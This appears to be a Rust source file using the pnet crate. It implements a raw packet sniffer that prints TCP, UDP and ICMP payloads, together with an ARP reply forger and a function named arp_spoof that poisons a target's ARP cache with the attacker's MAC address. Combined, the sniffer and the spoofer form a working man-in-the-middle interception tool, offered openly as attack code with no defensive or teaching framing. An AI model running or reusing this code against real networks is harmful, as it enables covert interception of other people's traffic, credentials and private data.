extern crate pnet;


use std::net::Ipv4Addr;

use pnet::datalink::{self, Channel::Ethernet};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::icmp::IcmpPacket;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::ipv6::Ipv6Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::udp::UdpPacket;
use pnet::packet::{MutablePacket, Packet};
use pnet::util::MacAddr;

pub fn read_network_interface(interface_name: String) {
    let interface_names_match = |iface: &datalink::NetworkInterface| iface.name == interface_name;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
                              .filter(interface_names_match)
                              .next()
                              .expect("Error finding the specified interface");

    // Create a channel to receive on
    let (_, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };

    println!("Listening on {}", interface_name);

    loop {
        match rx.next() {
            Ok(packet) => {
                let packet = EthernetPacket::new(packet).unwrap();
                // do not print packets from and for 00:00:00:00:00:00
                if packet.get_destination() == MacAddr::new(0, 0, 0, 0, 0, 0) || packet.get_source() == MacAddr::new(0, 0, 0, 0, 0, 0) {
                    continue;
                }
                println!("{} -> {} ({})", packet.get_source(), packet.get_destination(), get_ethernet_type(&packet));
                // print packet only if it is an ARP or a tcp packet
                if get_ethernet_type(&packet) != "IPv4" {
                    continue;
                }
                print_packet(&packet);
                println!();
            },
            Err(e) => {
                println!("An error occurred while reading packet: {}", e);
            }
        }
    }
}

/// Function that prints the whole content of a ipv4 packet
/// like source and destination IP address, protocol, payload, etc.
pub fn print_ipv4_packet(packet: &Ipv4Packet) {
    match packet.get_next_level_protocol() {
        IpNextHeaderProtocols::Tcp => {
            if let Some(tcp_packet) = TcpPacket::new(packet.payload()) {
                if tcp_packet.payload().len() == 0 {
                    return;
                }
                println!("TCP Packet: {}:{} to {}:{} | Data Length: {}",
                         packet.get_source(),
                         tcp_packet.get_source(),
                         packet.get_destination(),
                         tcp_packet.get_destination(),
                         tcp_packet.payload().len());
                // Print payload data as a UTF-8 string
                // Note: This might not always be readable depending on the payload content
                println!("***Payload (UTF-8): {:#?}", String::from_utf8_lossy(tcp_packet.payload()));
            }
        },
        IpNextHeaderProtocols::Udp => {
            if let Some(udp_packet) = UdpPacket::new(packet.payload()) {
                println!("UDP Packet: {}:{} to {}:{} | Data Length: {}",
                         packet.get_source(),
                         udp_packet.get_source(),
                         packet.get_destination(),
                         udp_packet.get_destination(),
                         udp_packet.payload().len());
                // Print payload data as a UTF-8 string
                println!("***Payload (UTF-8): {:#?}", String::from_utf8_lossy(udp_packet.payload()));
            }
        },
        IpNextHeaderProtocols::Icmp => {
            if let Some(icmp_packet) = IcmpPacket::new(packet.payload()) {
                println!("ICMP Packet: Type {:?}, Code {:?}",
                         icmp_packet.get_icmp_type(),
                         icmp_packet.get_icmp_code());
                // Optionally print payload data as a UTF-8 string
                // Note: This might not always be readable depending on the payload content
                println!("Payload (UTF-8): {:#?}", String::from_utf8_lossy(icmp_packet.payload()));
            }
        },
        _ => println!("Unsupported IPv4 Protocol: {:?}", packet.get_next_level_protocol()),
    }
}

/// Function that prints the content of a ethernet packet
/// depending on the type of the packet
/// like ARP, IP, etc.
pub fn print_packet(packet: &EthernetPacket) {
    match packet.get_ethertype() {
        EtherTypes::Ipv4 => {
            if let Some(ipv4_packet) = Ipv4Packet::new(packet.payload()) {
                print_ipv4_packet(&ipv4_packet);
            }
        },
        EtherTypes::Arp => {
            if let Some(arp_packet) = ArpPacket::new(packet.payload()) {
                println!("ARP Packet: Sender MAC: {}, Sender IP: {}, Target MAC: {}, Target IP: {}",
                         arp_packet.get_sender_hw_addr(),
                         arp_packet.get_sender_proto_addr(),
                         arp_packet.get_target_hw_addr(),
                         arp_packet.get_target_proto_addr());
            }
        },
        EtherTypes::Ipv6 => {
            if let Some(header) = Ipv6Packet::new(packet.payload()) {
                println!("IPv6 Packet: Source: {}, Destination: {}",
                         header.get_source(),
                         header.get_destination());
            }
        },
        _ => {
            println!("Other packet: {} -> {}", packet.get_source(), packet.get_destination());
        }
    }
}

/// Function that gets a ethernet packet and return the type of the packet
/// like ARP, IP, etc.
pub fn get_ethernet_type(packet: &EthernetPacket) -> String {
    match packet.get_ethertype() {
        EtherTypes::Arp => "ARP".to_string(),
        EtherTypes::Ipv4 => "IPv4".to_string(),
        EtherTypes::Ipv6 => "IPv6".to_string(),
        _ => format!("Other({})", packet.get_ethertype())
    }
}

/// Function that sends a ARP reply
/// arguments:
/// - target_ip: the IP address of the target
/// - target_mac: the MAC address of the target
/// - src_ip: the IP address of the source
/// - src_mac: the MAC address of the source
/// - interface_name: the name of the network interface
pub fn arp_reply(target_ip: Ipv4Addr, target_mac: MacAddr, src_ip: Ipv4Addr, src_mac: MacAddr, interface_name: &String) {
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
                              .filter(|iface| iface.name == *interface_name)
                              .next()
                              .expect("Error finding the specified interface");

    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, _not_used)) => (tx, _not_used),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };

    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(target_mac);
    ethernet_packet.set_source(src_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    println!("Sending ARP reply to {} ({})", target_ip, target_mac);
    println!("From {} ({})", src_ip, src_mac);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_sender_hw_addr(src_mac);
    arp_packet.set_sender_proto_addr(src_ip);
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);

    ethernet_packet.set_payload(arp_packet.packet_mut());

    tx.send_to(&ethernet_packet.packet(), None);
}

/// Function that performs arp spoofing by sending a ARP response
/// to the target with the MAC address of the attacker
/// arguments:
/// - target_ip: the IP address of the target
/// - target_mac: the MAC address of the target
/// - src_ip: the IP address of the attacker
/// - interface_name: the name of the network interface
pub fn arp_spoof(target_ip: Ipv4Addr, target_mac: MacAddr, source_ip: Ipv4Addr, interface_name: &String) {
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
                              .filter(|iface| iface.name == *interface_name)
                              .next()
                              .expect("Error finding the specified interface");
    
    let source_mac = interface.mac.unwrap();
    
    arp_reply(target_ip, target_mac, source_ip, source_mac, interface_name);
}
